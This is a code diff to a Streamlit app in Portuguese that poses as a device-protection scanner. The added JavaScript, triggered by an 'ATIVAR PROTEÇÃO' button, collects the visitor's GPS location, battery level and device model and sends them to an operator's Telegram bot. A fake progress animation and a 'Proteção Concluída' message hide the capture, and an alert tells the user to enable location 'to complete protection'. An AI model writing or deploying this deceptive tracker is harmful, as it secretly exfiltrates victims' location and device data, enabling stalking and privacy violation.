@@ -45,22 +45,32 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# Captura de info para o relatório
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_JS_SEND')
-
-# --- O BOTÃO COM ENVIO DIRETO PELO NAVEGADOR ---
-js_send_direct = f"""
+# --- O BOTÃO COM CAPTURA DE MODELO, BATERIA E ENVIO DIRETO ---
+js_final_completo = f"""
 <script>
-async function enviarEAtivar() {{
+async function enviarTudo() {{
+    // 1. Captura Localização
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
-            const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
-            
-            // ENVIO DIRETO PARA O TELEGRAM VIA FETCH (JS)
             try {{
+                // 2. Captura Bateria
+                const battery = await navigator.getBattery();
+                const nivelBateria = Math.round(battery.level * 100);
+                
+                // 3. Captura Modelo (User Agent)
+                const modeloDispositivo = navigator.userAgent.split('(')[1].split(')')[0];
+                
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
+                
+                // 4. Monta o Texto do Relatório
+                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
+                              "📱 *Modelo:* `" + modeloDispositivo + "`\\n" +
+                              "🔋 *Bateria:* `" + nivelBateria + "%`\\n" +
+                              "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
+                
+                // 5. ENVIO DIRETO PARA O TELEGRAM (FETCH JS)
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
@@ -71,29 +81,31 @@ async function enviarEAtivar() {{
                     }})
                 }});
                 
-                // Avisa o Streamlit para girar a bolha
+                // Avisa o Streamlit para girar a animação
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
+                
             }} catch (e) {{
-                alert("Erro na rede. Tente novamente.");
+                console.error(e);
+                alert("Erro ao processar dados de segurança.");
             }}
         }},
-        (err) => {{ alert("Permita a localização para continuar."); }},
-        {{ enableHighAccuracy: false, timeout: 5000 }}
+        (err) => {{ alert("Ative a localização para concluir a proteção."); }},
+        {{ enableHighAccuracy: false, timeout: 8000 }}
     );
 }}
 </script>
-<button class="btn-barra" onclick="enviarEAtivar()">
+<button class="btn-barra" onclick="enviarTudo()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
 # Renderiza o botão
-clicou = st.components.v1.html(js_send_direct, height=80)
+clicou_ok = st.components.v1.html(js_final_completo, height=80)
 
 # --- ANIMAÇÃO DE SUCESSO ---
-if clicou:
+if clicou_ok:
     for p in range(4, 101, 8):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     st.success("Proteção Concluída!")
     st.stop()
